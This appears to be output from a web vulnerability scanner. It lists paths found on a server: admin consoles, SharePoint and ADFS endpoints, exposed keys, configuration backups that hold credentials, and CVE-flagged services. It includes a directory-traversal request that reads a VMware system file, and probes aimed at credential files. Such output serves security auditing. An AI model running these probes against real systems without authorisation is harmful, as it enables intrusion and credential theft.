++ GET /vmailadmin/: Admin login page/section found.
++ GET /webadmin.asp: Admin login page/section found.
++ GET /webadmin.html: Admin login page/section found.
++ GET /webadmin.php: Admin login page/section found.
++ GET /webmaster/: Admin login page/section found.
++ GET /websvn/: Admin login page/section found.
++ GET /wizmysqladmin/: Admin login page/section found.
++ GET /wp-admin/: Admin login page/section found.
++ GET /wordpress/wp-admin/: Admin login page/section found.
++ GET /wp-login/: Admin login page/section found.
++ GET /wordpress/wp-login/: Admin login page/section found.
++ GET /xlogin/: Admin login page/section found.
++ GET /yonetici.asp: Admin login page/section found.
++ GET /yonetici.html: Admin login page/section found.
++ GET /yonetici.php: Admin login page/section found.
++ GET /yonetim.asp: Admin login page/section found.
++ GET /yonetim.html: Admin login page/section found.
++ GET /yonetim.php: Admin login page/section found.
++ GET /test.asp: This might be interesting.
++ GET /test.aspx: This might be interesting.
++ GET /test.php: This might be interesting.
++ GET /maintenance.asp: This might be interesting.
++ GET /maintenance.aspx: This might be interesting.
++ GET /maint/: This might be interesting.
++ GET /maint.asp: This might be interesting.
++ GET /maint.aspx: This might be interesting.
++ GET /sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/vmware/hostd/vmInventory.xml: VMWare ESX is vulnerable to a directory traversal attack. See: CVE-2009-3733: 
++ GET /servlets-examples/: Tomcat servlets examples are visible.
++ GET /admin-console: JBoss admin console is visible.
++ GET /help.php: A help file was found.
++ GET /gif/hp_invent_logo.gif: This device may be an HP printer/scanner and allow retrieval of previously scanned images.
++ GET /gif/tricolor_ink_guage.gif: This device may be an HP printer/scanner and allow retrieval of previously scanned images.
++ GET /messages/: This might be interesting.
++ GET /cms/: This might be interesting.
++ GET /helpdesk/: This might be interesting.
++ GET /3rdparty/phpMyAdmin/: phpMyAdmin directory found.
++ GET /phpMyAdmin/: phpMyAdmin directory found.
++ GET /3rdparty/phpmyadmin/: phpMyAdmin directory found.
++ GET /phpmyadmin/: phpMyAdmin directory found.
++ GET /pma/: phpMyAdmin directory found.
++ GET /.tools/phpMyAdmin/current/: phpMyAdmin directory found.
++ GET /spin/main.csp: CA iTechnology SPIN interface found.
++ GET /openadmin/: Informix OpenAdmin tool administration login.
++ GET /.git/index: Git Index file may contain directory listing information.
++ GET /.hg/dirstate: Mercurial DirState file may contain directory listing information.
++ GET /exception.php: PHP Exceptions File.
++ GET /adfs/ls/?wa=wsignin1.0&wtrealm=http://www.cirt.net/: Active Directory Federation Services sign in page found.
++ GET /manager/html: Tomcat Manager / Host Manager interface found (pass protected).
++ GET /jk-manager/html: Tomcat Manager / Host Manager interface found (pass protected).
++ GET /admin/html: Tomcat Manager / Host Manager interface found (pass protected).
++ GET /adfs/services/proxytrustpolicystoretransfer: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/fs/federationserverservice.asmx: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/samlprotocol/proxytrust: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/mexsoap: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/proxymexhttpget/: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/2005/windowstransport: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/2005/certificatemixed: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/2005/usernamemixed: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/2005/kerberosmixed: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/2005/issuedtokenmixedasymmetricbasic256: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/2005/issuedtokenmixedsymmetricbasic256: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/13/usernamemixed: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/13/issuedtokenmixedsymmetricbasic256: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trusttcp/windows: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/proxytrust: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/services/trust/proxytrustprovisionissuedtoken: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /FederationMetadata/2007-06/: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /Federationmetadata/2007-06/FederationMetadata.xml: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /adfs/ls/IdpInitiatedSignon.aspx: Active Directory Federation Services page found. See: https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/ad-fs-overview: 
++ GET /console/: Application console found.
++ GET /wsman/: Windows Remote Management is enabled.
++ GET /fantastico_fileslist.txt: fantastico_fileslist.txt file found. This file contains a list of all the files from the current directory.
++ GET /webservices/: Webservices found.
++ GET /atg/bcc: Oracle ATG Business Control Center.
++ GET /dyn/admin/: Admin page found; possibly Oracle ATG.
++ GET /system/console: OSGi Apache Felix console.
++ GET /repository/: CRX WebDAV upload.
++ GET /cqresource/: CRX WebDAV upload.
++ GET /dumpinfo: National Instruments Service Locator.
++ GET /manage/Logs/: Covertix SmartCipher Console Login and Web Service Log directory detected.
++ GET /rsa: Encryption key exposed.
++ GET /rsa.old: Encryption key exposed.
++ GET /dsa: Encryption key exposed.
++ GET /identity: Encryption key exposed.
++ GET /encrypt.aspx: This might be interesting.
++ GET /decrypt.aspx: This might be interesting.
++ GET /encrypt.php: This might be interesting.
++ GET /decrypt.php: This might be interesting.
++ GET /encrypt.asp: This might be interesting.
++ GET /decrypt.asp: This might be interesting.
++ GET /encrypt: This might be interesting.
++ GET /CHANGELOG.txt: Version number implies that there is a SQL Injection in Drupal 7, which can be used for authentication bypass (Drupalgeddon). See: CVE-2014-3704 https://www.sektioneins.de/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html: 
++ GET /debug.asp: Possible debug directory/program found.
++ GET /debug.php: Possible debug directory/program found.
++ GET /debug/: Possible debug directory/program found.
++ GET /~ftp/: Allowed to browse ftp user's home directory. See: CVE-2001-1013: 
++ GET /_vti_bin/owssvr.dll: FrontPage/Sharepointfile available.
++ GET /_vti_bin/_vti_adm/admin.exe: FrontPage/Sharepointfile available.
++ GET /_vti_bin/_vti_aut/author.exe: FrontPage/Sharepointfile available.
++ GET /_vti_bin/_vti_aut/WS_FTP.log: FrontPage/Sharepointfile available.
++ GET /_vti_bin/_vti_aut/ws_ftp.log: FrontPage/Sharepointfile available.
++ GET /_vti_bin/_vti_aut/author.dll: FrontPage/Sharepointfile available.
++ GET /_layouts/addrole.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/AdminRecycleBin.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/AreaNavigationSettings.aspx: FrontPage/Sharepointfile available.
++ GET /_Layouts/AreaTemplateSettings.aspx: FrontPage/Sharepointfile available.
++ GET /_Layouts/AreaWelcomePage.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/bpcf.aspx: FrontPage/Sharepointfile available.
++ GET /_Layouts/ChangeSiteMasterPage.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/create.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/editgrp.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/editprms.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/help.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/images/: FrontPage/Sharepointfile available.
++ GET /_layouts/listedit.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/ManageFeatures.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/mcontent.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/mngctype.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/mngfield.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/mngsiteadmin.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/mngsubwebs.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/mngsubwebs.aspx?view=sites: FrontPage/Sharepointfile available.
++ GET /_layouts/mobile/mbllists.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/MyInfo.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/MyPage.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/MyTasks.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/navoptions.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/NewDwp.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/newgrp.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/newsbweb.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/PageSettings.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/people.aspx?MembershipGroupId=0: FrontPage/Sharepointfile available.
++ GET /_layouts/permsetup.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/picker.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/policy.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/policyconfig.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/policycts.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/Policylist.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/prjsetng.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/quiklnch.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/recyclebin.aspx: FrontPage/Sharepointfile available.
++ GET /_Layouts/RedirectPage.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/role.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/settings.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/SiteDirectorySettings.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/sitemanager.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/SiteManager.aspx?lro=all: FrontPage/Sharepointfile available.
++ GET /_layouts/spcf.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/storman.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/themeweb.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/topnav.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/user.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/userdisp.aspx?ID=1: FrontPage/Sharepointfile available.
++ GET /_layouts/useredit.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/useredit.aspx?ID=1: FrontPage/Sharepointfile available.
++ GET /_layouts/viewlsts.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/vsubwebs.aspx: FrontPage/Sharepointfile available.
++ GET /_layouts/WPPrevw.aspx?ID=247: FrontPage/Sharepointfile available.
++ GET /_layouts/wrkmng.aspx: FrontPage/Sharepointfile available.
++ GET /Forms/DispForm.aspx: FrontPage/Sharepointfile available.
++ GET /Forms/DispForm.aspx?ID=1: FrontPage/Sharepointfile available.
++ GET /Forms/EditForm.aspx: FrontPage/Sharepointfile available.
++ GET /Forms/EditForm.aspx?ID=1: FrontPage/Sharepointfile available.
++ GET /Forms/Forms/AllItems.aspx: FrontPage/Sharepointfile available.
++ GET /Forms/MyItems.aspx: FrontPage/Sharepointfile available.
++ GET /Forms/NewForm.aspx: FrontPage/Sharepointfile available.
++ GET /Pages/default.aspx: FrontPage/Sharepointfile available.
++ GET /Pages/Forms/AllItems.aspx: FrontPage/Sharepointfile available.
++ GET /_catalogs/masterpage/Forms/AllItems.aspx: FrontPage/Sharepointfile available.
++ GET /_catalogs/wp/Forms/AllItems.aspx: FrontPage/Sharepointfile available.
++ GET /_catalogs/wt/Forms/Common.aspx: FrontPage/Sharepointfile available.
++ GET /_vti_pvt/service.grp: FrontPage/Sharepointfile available.
++ GET /_vti_pvt/structure.cnf: FrontPage/Sharepointfile available.
++ GET /server-manager/: Mitel Audio and Web Conferencing server manager identified.
++ GET /jk-manager/status: Tomcat Server Status interface found (pass protected).
++ GET /jk-status/status: Tomcat Server Status interface found (pass protected).
++ GET /host-manager/status: Tomcat Server Status interface found (pass protected).
++ GET /humans.txt: The humans.txt file may reveal information aboute site owners/developers. See: http://humanstxt.org/: 
++ GET /cms-admin/sites/new: ComfortableMexicanSofa CMS Engine Admin Backend (pass protected).
++ GET /system/console/bundles: Adobe Experience Manager OSGi console found.
++ GET /loleaflet/dist/admin/admin.html: LibreOffice Online Admin interface found (pass protected).
++ GET /dist/admin/admin.html: LibreOffice Online Admin interface found (pass protected).
++ GET /wls-wsat/ParticipantPortType: Oracle WebLogic Server may be vulnerable to remote takeover. See: CVE-2017-10271: 
++ GET /wls-wsat/CoordinatorPortType11: Oracle WebLogic Server may be vulnerable to remote takeover. See: CVE-2017-10271: 
++ GET /master.xml: This might be interesting.
++ GET /connection.xml: This might be interesting.
++ GET /conndb.xml: This might be interesting.
++ GET /conn.xml: This might be interesting.
++ GET /db.json: This might be interesting.
++ GET /userdata.json: This might be interesting.
++ GET /login.json: This might be interesting.
++ GET /master.json: This might be interesting.
++ GET /masters.json: This might be interesting.
++ GET /connections.json: This might be interesting.
++ GET /connection.json: This might be interesting.
++ GET /passwords.json: This might be interesting.
++ GET /PasswordsData.json: This might be interesting.
++ GET /users.json: This might be interesting.
++ GET /conndb.json: This might be interesting.
++ GET /conn.json: This might be interesting.
++ GET /accounts.json: This might be interesting.
++ GET /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
++ GET /.hgignore: .hgignore file found. It is possible to grasp the directory structure.
++ GET /.env: .env file found. The .env file may contain credentials.
++ GET /_async/AsyncResponseServiceJms?WSDL: BEA WebLogic may allow remote takeover. See: CVE-2019-2725 CNVD-C-2019-48814: 
++ GET /.wp-config.php.swp: .wp-config.php.swp file found. This file is swap file created when editing with vi/vim editor. This file contains the credentials.
++ GET /wordpress/.wp-config.php.swp: .wp-config.php.swp file found. This file is swap file created when editing with vi/vim editor. This file contains the credentials.
++ GET /wp-config.php~: wp-config.php~ file found. This file is a backup file created when editing with emacs editor. This file contains the credentials.
++ GET /wordpress/wp-config.php~: wp-config.php~ file found. This file is a backup file created when editing with emacs editor. This file contains the credentials.
++ GET /wp-config.php.bak: wp-config.php.bak file found. This file contains the credentials.
++ GET /wordpress/wp-config.php.bak: wp-config.php.bak file found. This file contains the credentials.
++ GET /wordpress/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ GET /wp-config.php_bak: wp-config.php_bak file found. This file contains the credentials.
++ GET /wordpress/wp-config.php_bak: wp-config.php_bak file found. This file contains the credentials.
++ GET /.dockerignore: .dockerignore file found. It may be possible to grasp the directory structure and learn more about the site.
++ GET /JAMonAdmin.jsp: JAMon - Java Application Monitor Admin interface identified. Versions 2.7 and earlier contain XSS vulnerabilities. See: CVE-2013-6235: 
